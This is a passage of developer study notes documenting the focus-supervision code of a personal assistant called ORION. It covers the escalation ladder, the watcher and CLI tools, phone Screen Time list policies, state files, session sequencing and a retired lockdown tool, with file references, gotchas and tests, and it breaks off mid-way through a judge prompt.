| **`orion-phone-time`** | The phone's Screen Time app lock status and grants | phone's report in `health-log.json`, grant in `screen-grant.json` | Current |

**State files on disk (paths only)** used in this section, all under `~/.openclaw/orion-controlled/` unless noted:
`ontask-state.json` (ladder, allow list, log), `focus-activity.json` (Swift app's 30 s sample), `focus-phone.json` (directive for the phone), `alerts-outbox.jsonl` (queued check-in text), `health-log.json` (phone Screen Time report in field `phoneScreen`), `screen-grant.json` (extra phone time), `focus-history.jsonl` (finished session records), `focus.json` (old lockdown), `focus-state.json` (Mac app's session, do not touch), `lock.json`, `permission-state.json`, `permission-audit.jsonl`, `remote.json`, `remote-inbound.json`, `remote-link.json`, `inbox.jsonl`, `actions/running`, `actions/cancel`; plus `~/.openclaw/orion-gate/approvals/{tickets,grants,chat}`.

---

### 6.1 Focus escalation ladder and on-task judgment (`lib/focus/escalation.mjs`)

- **What it is** Three pure functions that are the brain of schedule focus: `focusBlock` (is there a block he should be focused on right now?), `judgeActivity` (is what he is doing on-task?), and `nextStep` (the escalation state machine, plus the phone warning rule). No clock, no file I/O: the caller passes `now`.
- **Where** `scripts/lib/focus/escalation.mjs`: constants 3-13; `focusBlock` 20-44; `judgeActivity` 52-116; `nextStep` 123-233.
- **Units warning: "now" is minutes since local midnight, not milliseconds.** `orion-ontask-watch` passes `minute = hours*60 + minutes` (`scripts/orion-ontask-watch:17,27`). So `offSince`, `snoozeUntil` and `minutesOff` are all in minutes-of-day. A variable called `minutesOff` is literally `now - offSince` in those units (`escalation.mjs:179`).

#### How `focusBlock(blocks, now)` picks the block (`:20-44`)
For each block (calendar events converted by `toBlocks`, `scripts/lib/life/live-day.mjs:40-59`, with `start`/`end` minute-of-day), skipping those where `now < start || now >= end`:
1. A **real class** is not a focus block: `kind === "class" && fixed && source !== "orion"` -> skip (`:26-28`).
2. Allowed kinds: `study`, `side_project`, `deadline`, `other` (and `class` only if ORION made it, which `toBlocks` never produces; **(inferred)** dead branch). `gym`, `meal`, `rest` -> skip.
3. Title must not match `NON_FOCUS_TITLE_RE = /\b(nap|wind down|sleep|bed|break|rest|dinner|lunch|breakfast|meal|gym)\b/i` (`:13`).
4. The first match in list order wins; else `null`.
Gotcha **(inferred from `classify` at `live-day.mjs:13-23`)**: `classify` defaults to `"other"`, and `"other"` is an allowed kind, so any calendar event that doesn't match a known pattern and isn't a class (for example "Call Mum") is treated as a focus block and Instagram during it is "off task". Social plans like "dinner with friends" are exempted only by the non-focus title regex.

#### How `judgeActivity(block, activity, {allow})` decides on-task (`:52-116`)
Input `activity = {app, title, idleSeconds}` (the Swift sample). Checks in this exact order, first hit returns:
1. `idleSeconds >= 300` -> **off task**, "idle for too long" (`:59`). (He is away from the keyboard; it counts as not working.)
2. **Allow list**: any `allow` entry (lower-cased) contained in the app name or window title (substring, case-insensitive) -> **on task** "allowed app or title" (`:68-72`). Substring means `allow "x"` matches any app containing an x.
3. **Bad app**: `OFF_TASK_APPS.has(activity.app)` exact, case-sensitive: `Instagram, TikTok, Snapchat, Reddit, Twitter, X, Facebook, Netflix, Discord, Steam` -> off task `off-task app <name>` (`:5-8,80-84`).
4. **Bad title**: `OFF_TASK_TITLE_RE = /\b(instagram|tiktok|reddit|netflix|twitch|x\.com|twitter|facebook)\b/i` -> off task "off-task window title" (`:10,87`). This is how a browser tab on Reddit is caught while Safari itself is not in the app list.
5. **YouTube special case**: app or title contains "youtube". On task only if the activity title shares at least one word of **4+ letters** with the block title (words from `split(/\W+/)`); otherwise off task "youtube video not related to block" (`:92-112`). Example from the tests: block "Study Math" and video titled "Math tutorial" -> on task.
6. Otherwise **on task** "on-task activity" (`:115`).
So it is a **denylist** model: anything not recognised as a distraction is on task, including a browser on a random site. (Only the Swift watcher's own `lastWorkApp` list differs; see 6.3.)

#### The Mac ladder (`nextStep`, `:123-233`)
`MAC_STEPS = ["none","nudge","say","front","quit","lock"]` (`:3`). State: `{blockId, offSince, lastStep, snoozeUntil, phoneWarnedAt}`.
1. **No block** -> `{mac:"none", phone:"none", why:"no focus block"}`, `offSince=null`, `lastStep="none"` (`:125-134`).
2. **Snoozed** (`snoozeUntil !== null && snoozeUntil > now`) -> `none`/`none`, "snoozed", `offSince=null` (`:137-144`). This check runs **before** the new-block reset.
3. **New block id** -> state reset (`blockId` set, `offSince/lastStep` cleared, `snoozeUntil=null`, `phoneWarnedAt=null`) (`:147-158`).
4. `judgeActivity`. If on task: `offSince=null`, `lastStep="none"`, `mac "none"` (any single on-task sample wipes the clock, there is no hysteresis).
5. If off task: `offSince = now` if unset; `minutesOff = now - offSince`; target step by threshold (`:182-187`):

| minutes continuously off task | target step |
|---|---|
| >= 2 | `nudge` |
| >= 5 | `say` |
| >= 8 | `front` |
| >= 12 | `quit` |
| >= 20 | `lock` |
| < 2 | `none` |

6. **One step per call**: `nextIdx = min(targetIdx, currentIdx + 1)` where `currentIdx = MAC_STEPS.indexOf(lastStep)` (`:193`). It never skips upward. With a 30 s watcher a long-ignored distraction climbs one rung per tick once the thresholds are passed, so the step lands within about 30 s of its threshold. It also never goes down except by going on-task, snooze, or a new block. Test "instagram during study climbs one step at a time" (`tests/surfaces-focus-escalation.test.mjs:37-83`) walks none@600, none@601, nudge@602, nudge@603, say@605, front@610, **quit@620 (not lock, because from `front` it can only go to `quit`)**, lock@630.
7. **Phone rules** run regardless of Mac state (`:206-227`), using `phone.minutesInUse`: `>= 15` -> `phone:"block"`; `>= 10` -> `"warn"` the first time only (sets `phoneWarnedAt = now`), then `"none"` ("already warned"); `< 10` -> `"none"`. `phoneWarnedAt` is cleared only by a new block id, so there is one warning per block.
8. Returns `{mac, phone, why: "<mac why>; <phone why>", state}` with `why` like `off task for 3 min; phone use < 10 min`. Tests also pin: inputs are not mutated; a new block starts the ladder over; a snooze silences everything until it ends; coming back on task resets the ladder.

- **Contracts** Block shape `{id,title,kind,start,end,fixed,source}` (minutes of day). Activity `{app,title,idleSeconds}`. Result `{mac, phone, why, state}`.
- **History** `73dc672` 2026-10-01 ("Focus escalation rules") created it as an `agent(...)` task; `ff0ec35` 2026-10-02 ("connect native chat, Flux turns and schedule focus") wired it to the Mac app and the watcher. The code retains the agent's stream-of-consciousness comments (for example `:53-57,78-79,195-199`), which are not documentation: they are the model arguing with its brief. Trust the code, not those comments.
- **Gotchas & lessons**
  - **Midnight and snooze staleness (inferred from code).** All times are minute-of-day with no date. `snoozeUntil` persists in `ontask-state.json`; a snooze set late in the evening (say minute 1300) is still `> now` the next morning (minute 540) until a snooze check passes... and since the snooze check precedes the new-block reset, it would keep returning "snoozed" until the wall clock passes that minute again or `wrong`/`snooze` is rewritten. I have not reproduced this; it follows from `:137` and `:147` ordering plus `orion-ontask:102,151`.
  - `lock` here is `pmset displaysleepnow` (see 6.2): it **turns the display off**, which only locks the Mac if "require password immediately" is set. It is not `orion-lock`.
  - The Swift side's own "work app" exclusion list differs from `OFF_TASK_APPS` (6.3).
- **Walk it yourself** `node --test tests/surfaces-focus-escalation.test.mjs`; open `scripts/lib/focus/escalation.mjs:182-193` and trace minute 12 from `say`.
- **Questions to ask your tutor** Why a one-step-per-tick ladder instead of jumping to the target? What does a denylist cost versus a whitelist in this domain? What happens if `now` crosses midnight mid-block? Why is the YouTube rule a shared 4-letter word?

---

### 6.2 CLI: `scripts/orion-ontask`

- **What it is** The tool surface for the schedule-focus watcher: inspect and nudge the ladder, add allowances, report a wrong call, run an enforcement action by hand. It **never starts or stops a focus session** (since `224687a`/`6eb4dca`, ORION kept calling it "start a focus session"; it now redirects start/stop words to `orion-session`).
- **Where** `scripts/orion-ontask` (255 lines): parser 9-29, `resolveNow` 50-57, commands 65-231, dispatch 233-253.
- **Contracts** Default state file `~/.openclaw/orion-controlled/ontask-state.json` (`lib/focus/state.mjs:9`), override with env `ORION_FOCUS_STATE`. Env `ORION_FOCUS_DRY=1` makes `act` print instead of run. Parser: `--flag value` or boolean `--flag`; positionals collected. `--now HH:MM` (global, test hook) overrides the clock for `snooze`/`wrong`.

| Subcommand | Form | Effect |
|---|---|---|
| `status` | `status [--json]` | Prints `ladder`, today's allows (`a.date === today`, today is the **UTC** date `isoNow().slice(0,10)`), last 5 log entries. `--json` -> `{ladder, allows, log}`. |
| `snooze N` | `snooze <minutes 1..120> [--why TEXT] [--json]` | `ladder.snoozeUntil = nowMinute + N`; logs `snooze`. Outside 1..120 -> exit 2 `snooze requires minutes 1..120`. Prints `Snoozed until minute <m> (<N>m)`. |
| `allow` | `allow <app-or-site> [--block] [--today] [--until HH:MM] [--json]` | Appends `{match, until, date}` to `allow[]` and logs. `until` rules (`:121-128`): `--block` with `--until H:M` -> that minute-of-day; neither `--today` nor `--block` -> **1440** (end of day); otherwise `null` (`--today`, or `--block` without `--until`) which the watcher also treats as all day. Missing name -> exit 2. |
| `wrong` | `wrong [--why TEXT] [--json]` | "ORION misjudged": `ladder.offSince=null`, `lastStep="none"`, `snoozeUntil = now+15`; logs `wrong`. Prints `Ladder reset, snoozed 15 minutes`. |
| `act STEP` | `act nudge|say|front|quit|lock [--app NAME] [--json]` | Runs (or, in dry mode, prints) the action. Details below. |
| `log` | `log [--limit N] [--json]` | Last N (default 20) log entries `[at] event: detail`. |

  Any of `start|begin|run|session|focus|pause|resume|finish|stop|end` as the command prints the redirect message pointing to `orion-session start "<task>" [--minutes N | --until HH:MM]`; other unknown -> `Unknown command: x`. No command -> exit 2.
- **`act` in detail** (`:164-216`): `--app` must match `/^[A-Za-z0-9 .&-]{1,40}$/` else exit 2 (no shell metacharacters; spawned without a shell, as an argv array, so a spaced name stays one argument, pinned by a test). It writes the log entry **first**, then:

| step | real command | needs `--app` |
|---|---|---|
| `nudge` | `osascript -e 'display notification "Back to your scheduled work." with title "ORION"'` | no |
| `say` | `say "Back to your scheduled work."` (spoken aloud) | no |
| `front` | `open -a <app>` | yes |
| `quit` | `osascript -e 'tell application "<app>" to quit'` | yes |
| `lock` | `pmset displaysleepnow` | no |

  In dry mode (`ORION_FOCUS_DRY=1`) it only prints the command line (note the printed `nudge`/`say` strings are just the words "nudge"/"say"). A failing command prints the error and exits 1. **Never run `act` on your own machine for study; use the dry env var if at all.**
- **Calls out to** `osascript`, `say`, `open`, `pmset`. State is read/written via `lib/focus/state.mjs` (6.4).
- **History** `70c69b8` 2026-10-01 "focus-cli: orion-ontask tools"; `ff0ec35` 2026-10-02 surfaces wiring; `224687a` 2026-10-07 redirect start-words to orion-session; `6eb4dca` 2026-10-06 moved its state file (below).
- **Tests** `tests/surfaces-focus-cli.test.mjs` pins: fresh status; snooze sets `snoozeUntil` and logs; snooze outside 1..120 exits 2; allow recorded for today; `wrong` resets and snoozes 15; `act quit` dry prints the osascript line; quotes in app name refused; log capped at 500; corrupt state reads as empty; spaced app name preserved as one argument.
- **Gotchas & lessons**
  1. **The state-file collision (2026-10-06, `6eb4dca`).** `orion-ontask` originally kept its state in `focus-state.json`, which is the *Mac app's* focus-session file. It overwrote it, so the app could not start or show a session. The comment at `lib/focus/state.mjs:7-9` records it; the state now lives in `ontask-state.json` and the old file was moved there.
  2. **Date mismatch (inferred from code).** `allow` stores `date = UTC date` (`orion-ontask:132`) and `status` filters by UTC date, but `orion-ontask-watch` compares against the **local** date (`localDate(now)`, `orion-ontask-watch:22`). In any timezone behind UTC, an allowance made in the evening is dated "tomorrow" in UTC and the watcher ignores it until the local date matches.
  3. `--now` for `status` has no effect on the date (the code says so in a comment, `:70`).
  4. The model is told about this tool in `plugin/workspace/AGENTS.md:441` ("snooze 10 --why ...", "allow ... --today", "wrong", "act ..."); `orion-selfdoc:319` describes it as only watching.
  5. Bare `allow X` stores `until: 1440` while `allow X --today` stores `until: null`. The watcher treats both as all day, but `status` prints "end of day" only for null, so a bare allow shows `until 1440`. Neither this nor the date mismatch above is covered by a test.
- **Walk it yourself** `ORION_FOCUS_STATE=/tmp/ot.json node scripts/orion-ontask status` (read-only on a missing file) then `ORION_FOCUS_STATE=/tmp/ot.json ORION_FOCUS_DRY=1 node scripts/orion-ontask act quit --app Safari` (prints the osascript line; with DRY it executes nothing but still writes a log line into `/tmp/ot.json`).
- **Questions to ask your tutor** Why does the model have `act lock` at all if the watcher already handles enforcement? What guards stop `--app` from becoming shell injection? Why was the state file split from the app's?

---

### 6.3 CLI: `scripts/orion-ontask-watch` (the supervisor tick)

- **What it is** The script the Mac app runs every 30 seconds while the app is open. It reads the app's activity sample, finds the current focus block, runs `nextStep` and `listsToBlock`, writes the phone directive, queues alerts, and (only if allowed) performs intrusive steps by calling `orion-ontask act`.
- **Where** `scripts/orion-ontask-watch` (47 lines, dense). Caller: `native/Orion/Sources/Orion/ScheduleFocusWatcher.swift:8-36`.
- **The Swift half.** `ScheduleFocusWatcher` has a 30 s `Timer` (`:10`). Each tick it reads the frontmost app (`NSWorkspace`), the focused window title (Accessibility API), idle seconds (`CGEventSource.secondsSinceLastEventType`), and writes `focus-activity.json` atomically with `{at, app, title, idleSeconds, enforcementAllowed, workApp}` (`:26`). `workApp` is the last non-distracting app: it updates only when the front app is not in `["Instagram","TikTok","Reddit","X","Twitter","Facebook","YouTube"]` and is not "Orion" (`:23`). `enforcementAllowed` is the app's existing "focus enforcement" consent switch, passed in by the caller (`start(enforcement:)`). Then it launches `~/.openclaw/tools/node-v24.15.0/bin/node ~/.openclaw/orion-remote/scripts/orion-ontask-watch` (the **installed copy**, not the repo) and waits; a `running` flag prevents overlapping runs.
- **How the Node half works** (line numbers in `orion-ontask-watch`):
  1. `:16` If `evalMode()` or `sandbox()` is on (a scenario evaluation), print "Focus watcher paused during evaluation." and exit 0. (`lib/eval-mode.mjs`: marker file `eval-mode`, valid < 2 h old.)
  2. `:17` `now = clockNow()` (honours `ORION_RESCHEDULE_NOW` or the sandbox clock), `minute = h*60+m`.
  3. `:18-19` Read `focus-activity.json`; if missing or `Date.now() - activity.at > 90_000` -> print "No fresh native activity sample." and exit 0. So if the Mac app is closed or asleep, supervision silently stops.
  4. `:20` `blocks = toBlocks(await calendarEvents(), localDate(now))` (Apple Calendar via the Mac bridge) and `block = focusBlock(blocks, minute)`.
  5. `:21-22` Load state; `allow` = today's (local date) entries with `until == null || until > minute`, mapped to `.match`.
  6. `:23-25` Phone usage: `health-log.json` -> `phoneScreen`; considered fresh if `sample.at` is under **5 minutes** old; `usedToday[list] = Number(sample.usedMinutes[list] ?? 0)` for each of `messaging, feeds, video, games`, else zeros.
  7. `:26-27` Ladder (defaults merged with stored) -> `nextStep(ladder, {now: minute, block, activity, phone: {minutesInUse: Math.max(...usedToday)}, allow})`. Note it uses the **maximum single list**, not the sum.
  8. `:28-29` `listsToBlock({block, usedToday, current: null, escalation: step.phone})` and persist `step.state` into `ontask-state.json` (preserving `allow` and `log`).
  9. `:30-31` Write the directive `focus-phone.json` (tmp + rename): `{at: ISO now, until: block end as ISO (or now if no block), block: [lists to block], why}`. The phone helper (`native/OrionLink/App/LinkEngine.swift:486-490`) only honours it if `at` is under 90 s old.
  10. `:32-35` Alerts appended as JSONL to `alerts-outbox.jsonl` as `{at, kind:"checkin", text}`: on phone `warn`: "Ten minutes on your phone during <block>. Put it down; distracting lists block at fifteen."; on Mac `nudge` or `say` **when the step changed** (`step.mac !== ladder.lastStep`): "You planned <block>. Back to it — <why>.".
  11. `:36-46` For `front`/`quit`/`lock` when the step changed, **only if `activity.enforcementAllowed`**, spawn `process.execPath orion-ontask act <step> [--app T]` with a 10 s timeout, where `T = workApp` for `front` and the current `activity.app` for `quit`; `lock` needs no target; `front`/`quit` with no target are skipped.
  12. `:47` Prints one JSON line `{block, mac, phone, why, state, lists}` (the Swift side discards it: stdout is `nullDevice`).
- **Phone lists policy** (`lib/focus/phone-lists.mjs:19-80`, `listsToBlock`) Lists are `["messaging","feeds","video","games"]` (`:1`). Rules, in order:
  - Daily caps (always): `feeds >= 120` min -> block feeds ("feeds over 2 hours today"); `video >= 120` -> block video; **if feeds are blocked and `video >= 30`** -> block video too ("video continues after feeds capped"); `games >= 90` -> block games.
  - During a focus block (kind in `study, side_project, deadline, other`) **with escalation `"block"`** (i.e. phone use >= 15 min): block `feeds`, `video`, `games`; block `messaging` only if `current === "messaging" && allowMessaging === false` (the watcher passes `current: null`, so messaging is never blocked by the watcher).
  - `warn` and `none` add nothing. Output `{block:[...], keep:[...], why}` in `LISTS` order, no duplicates; `why` joins reasons with "; " or "within daily limits". Validates inputs strictly (`TypeError` on bad shapes; this replaced `assert` in `0604567`).
- **Phone-time accounting, in one sentence:** the phone reports per-list usage minutes inside `health-log.json.phoneScreen.usedMinutes`; the watcher trusts it only if under 5 minutes old, uses `max()` across lists for the 10/15-minute ladder and the per-list values for the daily caps, and publishes the result as a short-lived directive file the phone reads. (Who writes `usedMinutes` on the phone side is not in my scope; the helper `TrackingLog.swift:135` stores the phone's report as `phoneScreen`.)
- **Phone-list accounting path and test notes** The phone app reports `phoneScreen` (`{at, locked, until, why, graceUntil?, usedMinutes:{messaging,feeds,video,games}}`) whenever Nick messages from the phone app; `native/OrionLink/Sources/LinkCore/TrackingLog.swift:130-138` writes it into the Mac's `health-log.json` and also appends it to a `screenLog` capped at the last 300 entries (`:137`). Only the latest report is used by the scripts. On the phone side, `usedMinutes` for a list is zeroed unless its `usedAt` stamp is from today and under 300 s old (`native/OrionMobile/App/FocusLock.swift:129-148` region). The phone groups its Screen Time selections by the same four names (`native/OrionMobile/App/FocusLists.swift:6`); apps inside a list are opaque tokens, so the Mac sees only list names and minute counts. `messaging` has no daily cap. Tests: `tests/surfaces-phone-lists.test.mjs` (nothing blocked on a normal day; two hours of feeds blocks feeds only; video blocked after feeds capped; messaging left open at the `block` step; nap/meal blocks never trigger the focus rule; invalid input throws `TypeError`). History: `a5cab54` 2026-10-01 (policy), `0604567` 2026-10-01 (explicit `TypeError`s).
- **Whole-day totals gotcha (code-observed)** The 10/15-minute thresholds in `nextStep` use `max(usedToday)`, the largest whole-day single-list total, not usage during the block. After heavy scrolling earlier in the day the phone step can already be `block` in the first minute of a study block, so "Ten minutes on your phone during <block>" may overstate recency **(inferred reading; the code has no per-block baseline)**.
- **Side effects** Writes `ontask-state.json`, `focus-phone.json`, `alerts-outbox.jsonl`; may run `orion-ontask act` (osascript/say/open/pmset). Sends no messages itself: alerts are queued and delivered by the Link helper (it drains the outbox, `LinkEngine.swift:163-170`).
- **History** One commit: `ff0ec35` 2026-10-02 "feat(surfaces): connect native chat, Flux turns and schedule focus".
- **Tests** `tests/surfaces-focus-watch.test.mjs` (22 dense lines): with a fake bridge (`ORION_BRIDGE_BIN`) and a study block 09:00-11:00 and Instagram in front, minute 0 -> exit 0; minute 3 -> `mac:"nudge"`; minute 4 -> still exactly **one** alert line in the outbox (one nudge per step); with `snoozeUntil=570` set -> `mac:"none"` at 09:06; a stale (year 2000) sample -> "No fresh". Because it runs with an isolated `HOME`, it touches none of the real state.
- **Gotchas & lessons**
  1. **Alert rows likely never reach the phone (inferred).** The watcher's outbox rows have no `id` field, and `LinkEngine.swift:~172` builds a CloudKit record only for alerts that have both `text` and `id` (`guard let text..., let id = alert["id"]`). `orion-watch` rows (`scripts/orion-watch:195`) carry ids from their own alert objects. Reading the code, the focus check-ins would be silently dropped by `compactMap`. I did not run it end to end; verify before relying on phone nudges from this path. (The outbox file is truncated after every read, so they are not retried.)
  2. `enforcementAllowed` is the only brake on `front`/`quit`/`lock`; nudge and say are not gated.
  3. The installed-copy rule: Swift runs `~/.openclaw/orion-remote/scripts/orion-ontask-watch`, so a repo edit does nothing until the install script copies it (same rule documented in `scripts/orion-remote-install:22`).
  4. Blocks that run past midnight are clipped to 1440 by `toBlocks`.
- **Walk it yourself** `sed -n 14,47p scripts/orion-ontask-watch`; read `native/Orion/Sources/Orion/ScheduleFocusWatcher.swift`; `node --test tests/surfaces-focus-watch.test.mjs`.
- **Questions to ask your tutor** Walk one 30-second tick from `focus-activity.json` to `focus-phone.json`. Why is the activity sample rejected after 90 s? What would happen on a laptop that sleeps in the middle of a block?

---

### 6.4 State module (`lib/focus/state.mjs`)

- **What it is** Read/write helpers for `ontask-state.json`.
- **Where** `scripts/lib/focus/state.mjs:1-55`.
- **How it works** `stateFile(env)` returns `env.ORION_FOCUS_STATE` or `~/.openclaw/orion-controlled/ontask-state.json`. `readState` returns `{ladder, allow, log}` and falls back to empty on any error or wrong type, truncating `log` to the last 500 entries. `writeState` creates the dir, writes a hidden `.orion-state-tmp-<uuid>` and `rename`s it; on any failure it deletes the temp file and **silently swallows the error**.
- **Contracts** `{ladder:{blockId, offSince, lastStep, snoozeUntil, phoneWarnedAt}, allow:[{match, until, date}], log:[{at, event, detail}]}`.
- **Gotchas** A failed write is silent, so the watcher can believe it escalated while nothing persisted. A corrupt file reads as empty rather than blocking (a deliberate choice shared with `orion-focus`: "a corrupt state file must not mean locked forever").

---

### 6.5 Sequences, day total (`lib/focus/sequence.mjs`, `lib/focus/day-total.mjs`) and the focus report

These three belong to the *focus session* (app) world, not the ladder. All were added in `656db4d` (2026-10-06, "any work/break sequence, start part-way, recover an ended session, today's total"). They are pure; `scripts/orion-session` consumes them (outside my scope; `tests/focus-cli.test.mjs` exercises it).

**`sequence.mjs`**
- `parseSequence(text)` turns Nick's words into phases `[{kind:"focus"|"rest", minutes}]`. Compact forms: `20w 5b 40w` (w/b/r suffix tokens) and `20/5/40` (alternating, starting with focus) (`:26-35`). Natural language is split on `, ; -> + then and then followed by after that` and each piece gets minutes from digits (with optional h/hr/hour), "half an hour" 30, "an hour" 60, "hour and a half" 90 or a number word (one..twenty, twenty-five, thirty, forty, forty-five, fifty, sixty, ninety). Kind: `REST` regex (break, rest, pause, b, r) -> rest; `FOCUS` regex (work, focus, block, study, session, sprint, pomodoro, w) -> focus; unlabelled pieces alternate (first is focus).
- Validation (`:37-48`): 1 to **12** phases; focus phase 1-**180** min, rest phase 1-**60** min; total at most **600** min (10 h). Errors are `TypeError` with messages written for Nick.
- `remainingFrom(phases, {phaseIndex, elapsedMinutes})` (start part-way): subtracts elapsed from the first phase, rounds to half-minutes, drops it if <= 0.5 min left.
- `recoverFromHistory(record, {blockMinutes, restMinutes})` rebuilds what is left of an early-ended session from a `focus-history.jsonl` row (`reason !== "completed"`): `blockSeconds = plannedFocusSeconds / totalFocusBlocks`, rest default from `plannedRestSeconds / (blocks-1)` or 10 min; remainder of the interrupted block if >= 1 minute, then alternating rest/focus for the remaining blocks. Completed -> `null` ("nothing to recover").
- `describeSequence` -> `"20m focus → 5m break → 40m focus"`; `toRequestPhases` -> `[{kind, seconds}]` for the app's start-sequence request. Tests `tests/focus-sequence.test.mjs`.

**`day-total.mjs`** (comment: 6 Oct 2026, restarting a session made ORION report only the latest segment, "16 minutes" on a 2-hour day)
- `focusToday(records, {dayKey, live})` adds every record for `dayKey` (`YYYY-MM-DD`) from the history plus the live session: `sessions` = records with >= 60 s served (+1 if live), `focusSeconds`, `restSeconds`, `latestSessionSeconds`, `longestSessionSeconds`. `formatFocusToday` -> `Focused today: 2h 5m across 3 sessions (latest 20m).` or `No focus time yet today.` if under 30 s. Tests `tests/focus-day-total.test.mjs` (blips under a minute add time but not a session count).

**Focus report: `scripts/orion-focus-report` + `scripts/lib/orion-focus-report.mjs`**
- **What it is** A read-only weekly summary of `focus-history.jsonl`.
- **Contracts** `orion-focus-report [--file PATH] [--days N] [--now ISO] [--json]`. Default file `~/.openclaw/orion-controlled/focus-history.jsonl`; `--days` default **7**, must be finite and >= 1 else exit 2 (`Bad --days: x`); `--now` fixed clock; unknown flags and positionals are tolerated (`parseArgs` with `strict:false`).
- **How it works** Window `[now - days*86400000, now+1)`. `focusReport(rows, {from,to})` (`lib/orion-focus-report.mjs:8-94`): rows lacking a string `startedAt` or finite numeric `servedFocusSeconds` (or unparsable) are counted in `skipped`; rows outside the window are excluded silently. Groups by **UTC** day of `startedAt`; per day `sessions`, `focusMinutes` (rounded to 0.1), `completedBlocks` (sum of `completedFocusBlocks`), `earlyEnds` (rows with `reason === "early"`). `longest` = row with most `servedFocusSeconds`. No sessions -> prints `No focus sessions recorded.` Text output: `Focus, last N day(s): S session(s), M min`, then `  <day>  <n> session(s)  <m> min  <e> ended early` ascending, then `Longest: <min> min (<task>) on <day>`. `--json` prints `{totals, byDay, longest, skipped}`.
- **Side effects** none (read only). **Tests** `tests/ops-focus-cli.test.mjs`, `tests/ops-focus-report.test.mjs`. **History** `72c5bb2` (lib) and `8be51dd` (CLI), 2026-09-27, part of the attention-and-ops plan (Phase 60 report, `HANDOFF.md:635`).
- **Output format** No sessions: `No focus sessions recorded.` (exit 0). Otherwise `Focus, last 7 day(s): 5 session(s), 142.5 min`, one line per day ascending (`  2026-10-07  2 session(s)  60 min  1 ended early`), then `Longest: 50 min (<task>) on <date>`. An unparseable `--now` gives an empty window, not an error. **Difference from `orion-session today`**: this report buckets by UTC `startedAt` date and counts every row (including sub-minute blips) as a session; `focusToday` uses the record's local `dayKey` and counts only sessions of 60 s or more. The two can disagree near midnight. Walk it: `node scripts/orion-focus-report --days 14` (read-only).
- **Gotchas** Days are bucketed by UTC, so an evening session in a US timezone can show on the next day's line; the app's own `dayKey` field (used by `focusToday`) is local and is not used here.

---

### 6.6 CLI: `scripts/orion-focus` (retired lockdown, still shipped)

- **What it is** "Lockdown mode. Orion as the friend who takes your phone away." (`:2`). A strike-counting focus enforcer driven by a per-minute cron `check`, with an LLM judge who decides whether Nick may be let off. Nick asked for it in his own words: yell at him, lock him onto the task, and make him reason his way out (`:5-8`).
- **Status** Removed from ORION's allowlist on 2026-10-06 (`6eb4dca`: "orion-focus is off ORION's allowlist; his rules say focus = orion-session") because nothing he could see backed it, it allowed no browser and nagged on Discord. Still in `plugin/workspace/TOOLS.md:64`, `PLAYBOOK.md:84`, `plugin/orion-control/src/exec-routing.ts:36`, `selfrepair.ts:358`, `automation.ts:84` (comment) and `orion-selfdoc:327`. The Swift app copies its ideas (`native/Orion/Sources/SessionDomain/Enforcement.swift:95`: always-allowed apps "matches scripts/orion-focus, which learned this first").
- **Where** `scripts/orion-focus` (510 lines). Constants 51-56; `frontmostApp` 81-92; `setFocusMode` 112-120; `prepare` 157-189; `start` 192-244; `next` 246-307; `prepare` 309-315; `check` 317-403; `status` 405-419; `plead` 421-491; `end` 493-506.
- **Contracts** State file `~/.openclaw/orion-controlled/focus.json` (**not** `focus-state.json`, the app's). Shape `{session:{task, startedAt, until, allowedApps[], anchor, repo?, repoPath?, fromCalendar?, strikes, lastSpokeAt?, grants:[{until, reason, argument}]}}`. A corrupt or missing file reads as `{}` so a bad file can never mean "locked forever" (`:65-73`). `ALWAYS_ALLOWED = ["Orion","Finder","loginwindow","1Password","System Settings"]` (`:56`). The judge model is `MODEL = "gpt-oss:20b"` (`:52`), a local Ollama model.

| Subcommand | Form | What it does |
|---|---|---|
| `start` | `start "<task>" [minutes] [apps...] [--repo KEY]` | Task required. `minutes` default 60, integer **5..480**. `--repo` can be anywhere; the key is resolved against `DEV_REPOSITORIES` imported from the installed plugin `~/.openclaw/extensions/orion-control/dist/devops.js` (a closed table, never a path). Builds the session (`until = now + minutes`, `allowedApps = apps + ALWAYS_ALLOWED`, `anchor = first app`, `strikes 0`, `grants []`), saves it, prints `locked on:`/`allowed:`, runs **prepare**, then `setFocusMode(true)`, then announces. |
| `next` | `next [apps...]` | Calls `orion-agenda upcoming --json` (20 s timeout); refuses to guess if the calendar can't be read ("I cannot read the calendar, so I will not guess at a block"). Takes the first event starting in the future; length from the event (5..480, or 60 if no end); `until` = the block's own end. Records `fromCalendar`. Nothing upcoming -> exit 1. |
| `prepare` | `prepare` | Needs an active session. Runs `open -a` for each allowed app (except always-allowed), `git status --short --branch` and `git log --oneline --no-decorate -5` in the repo (if `--repo`), and `orion-agenda today` (first 6 lines, or a "blind spot, not an empty day" line). |
| `check` | `check` | One enforcement tick (see below). |
| `status` | `status` | Prints task, minutes left, strikes, grace and allowed apps, or `no active focus session`. |
| `plead` | `plead "<reason>"` | Sends the reason to the local judge (below). |
| `end` | `end` | Clears the session, calls `setFocusMode(false)`, prints `session ended`. |
| (other) | | `usage: orion-focus start "<task>" <minutes> [apps...] | check | status | plead "<reason>" | end` exit 2. |

- **How `check` works** (`:317-403`)
  1. No active session (`Date.now() > session.until` counts as none). If a stale session object remains, clear it, say "Time's up. You're free." and print `session ended`; else `no active session`.
  2. A grant active (`grants.at(-1).until > now`) -> print `grace: N min left (<reason>)` and stop (suspended, not ended).
  3. Frontmost app via `lsappinfo info -only name $(lsappinfo front)` (no TCC permission prompt). If the app is empty/unknown or in `allowedApps` -> on task; strikes **decay by 1** per on-task check.
  4. Otherwise `strikes += 1` and apply a **speaking cooldown** so a once-a-minute cron does not become "a car alarm": `COOLDOWN_MS = {1: 6 min, 2: 4 min}[strikes] ?? 2 min` (`:368`). If less than that has passed since `lastSpokeAt`, record the strike, print `OFF TASK: <app> (strike N, quiet for another M min)` and say nothing.
  5. When it may speak: strike 1: `"<app>. You're meant to be on <task>."`; strike 2: `"Nick. <task>. Not <app>."`; strike 3+: `"Enough. <task>. N minutes left. Talk to me if you have an actual reason."` **and** it raises the anchor app with `open -a`. Speech is just a stdout line `ORION: ...` (the `announce` function no longer uses `say`, `:94-95`, changed in `e34a9c6` 2026-10-02 "speak only for voice turns").
  6. Quiet hours deliberately do **not** apply (he may start a session at 1 am because that is when he avoids the thing).
- **`plead` and the judge** (`:421-491`) Prompt sent verbatim (variables filled):

```text
Nick is in a focus session he set himself.

Task: <task>
Time remaining: <N> minutes
Times he has already wandered off: <strikes>
Exceptions already granted this session: <grants.length>

He is asking to be let off. His reason:

"<argument>"

Decide. Reply with exactly one line, in one of these two forms:

GRANT <minutes> <short reason>
DENY <short reason>

Rules for deciding:
- Grant only for something genuinely outside his control or genuinely urgent:
